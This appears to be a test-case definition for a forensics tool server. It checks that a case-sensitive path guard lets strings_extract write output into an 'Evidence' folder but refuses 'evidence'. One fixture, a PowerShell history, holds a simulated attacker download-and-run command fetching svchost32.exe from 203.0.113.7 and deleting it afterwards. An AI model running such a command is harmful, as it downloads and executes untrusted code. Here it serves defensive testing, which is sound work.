# Matrix case P1034-007: the output guard (core/paths.py is_evidence_path)
# protects /cases/, /mnt/, /media/ and any path segment equal to "evidence",
# compared case-sensitively. A case folder whose evidence folder is named
# "Evidence" (as Windows-side tooling and many case templates spell it) is not
# protected: strings_extract writes its output file into it, while the same
# call into a folder named "evidence" is refused.
# Two case folders under ${OUTSIDE}/cases (not under the runner's evidence
# root, whose path already holds an "evidence" segment): WKS-0412 keeps its
# evidence in Evidence/, WKS-0419 in evidence/. Each holds the PowerShell
# history file of its host.
case_id: P1034-007
problem: P1034
server: trudi
variant: trudi-88fbca7
commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
display: side-effect
level: mcp
realism: possible
realism_ko: "`output_path`는 모델 인자다. 증거 폴더를 `Evidence`처럼 대문자로 시작하게 두는 배치는 실제로 있고, 모델이 출력 파일을 입력 파일 옆에 두려고 그 폴더 경로를 주는 일이 생긴다."
coverage: full
summary: strings_extract with output_path=<case>/Evidence/out.txt returns success and writes the file into the case's evidence folder, while the same call with output_path=<case>/evidence/out.txt is refused as a protected evidence directory, because the guard compares the "evidence" segment case-sensitively.
summary_ko: "`strings_extract`에 `output_path=<사건>/Evidence/out.txt`를 주면 성공하고 사건의 증거 폴더 안에 파일을 쓴다. 같은 호출을 `<사건>/evidence/out.txt`로 하면 보호된 증거 폴더라며 거부한다. 보호 검사가 `evidence` 조각을 대소문자를 가려 비교하기 때문이다."
defect_ko: "이 서버는 쓰기 보호 위치를 경로 접두어와 소문자 `evidence` 조각으로만 정해, `Evidence`라는 이름의 증거 폴더에는 도구 출력을 써 버린다. 사건 설정의 증거 위치나 대소문자를 가리지 않는 비교로 보호해야 한다. 모델과 분석가는 증거 폴더가 읽기 전용으로 지켜진다고 알지만 증거 폴더에 분석 산출물이 섞인다."
setup_ko: "증거 폴더 이름이 `Evidence`인 사건(WKS-0412)과 `evidence`인 사건(WKS-0419)을 나란히 두고, 각 사건의 증거 파일에 `strings_extract`를 부르며 출력 경로를 그 증거 폴더 안으로 준다."
fixture:
- path: cases/WKS-0412/analysis
  root: outside
  dir: true
- path: cases/WKS-0419/analysis
  root: outside
  dir: true
- path: cases/WKS-0412/Evidence/ConsoleHost_history.txt
  root: outside
  text: "cd $env:TEMP\r\nInvoke-WebRequest -Uri http://203.0.113.7/u.exe -OutFile svchost32.exe\r\n.\\svchost32.exe -k netsvcs\r\nRemove-Item .\\svchost32.exe\r\n"
- path: cases/WKS-0419/evidence/ConsoleHost_history.txt
  root: outside
  text: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5\r\nGet-Service wuauserv\r\n"
steps:
- tool: misc_start_execution_log
  note_ko: "준비: 사건 WKS-0412의 기록을 연다"
  args:
    case_id: WKS-0412
    output_path: ${OUTSIDE}/cases/WKS-0412/analysis/WKS-0412_trace.json
    case_dir: ${OUTSIDE}/cases/WKS-0412
    launch_dashboard: false
- tool: strings_extract
  note_ko: "결함 호출: 출력 경로를 `Evidence/` 폴더 안으로 준다"
  args:
    file_path: ${OUTSIDE}/cases/WKS-0412/Evidence/ConsoleHost_history.txt
    min_length: 6
    output_path: ${OUTSIDE}/cases/WKS-0412/Evidence/out.txt
- tool: misc_start_execution_log
  note_ko: "준비: 사건 WKS-0419의 기록을 연다"
  args:
    case_id: WKS-0419
    output_path: ${OUTSIDE}/cases/WKS-0419/analysis/WKS-0419_trace.json
    case_dir: ${OUTSIDE}/cases/WKS-0419
    launch_dashboard: false
- tool: strings_extract
  note_ko: "비교 호출: 같은 호출을 소문자 `evidence/` 폴더로 한다"
  args:
    file_path: ${OUTSIDE}/cases/WKS-0419/evidence/ConsoleHost_history.txt
    min_length: 6
    output_path: ${OUTSIDE}/cases/WKS-0419/evidence/out.txt
expect:
- step: 2
  note_ko: "`Evidence/` 안으로 출력하는 호출이 성공한다"
  regex: '"success": true, "ascii_lines": [1-9]\d*, .*"output_path": "[^"]*/cases/WKS-0412/Evidence/out.txt"'
- file_exists: ${OUTSIDE}/cases/WKS-0412/Evidence/out.txt
  note_ko: 증거 폴더 `Evidence/` 안에 출력 파일이 생긴다
- step: 4
  note_ko: 소문자 `evidence/`로 주면 보호된 증거 폴더라며 거부한다
  contains: is inside a protected evidence directory
- file_missing: ${OUTSIDE}/cases/WKS-0419/evidence/out.txt
  note_ko: 소문자 `evidence/` 폴더에는 파일이 생기지 않는다
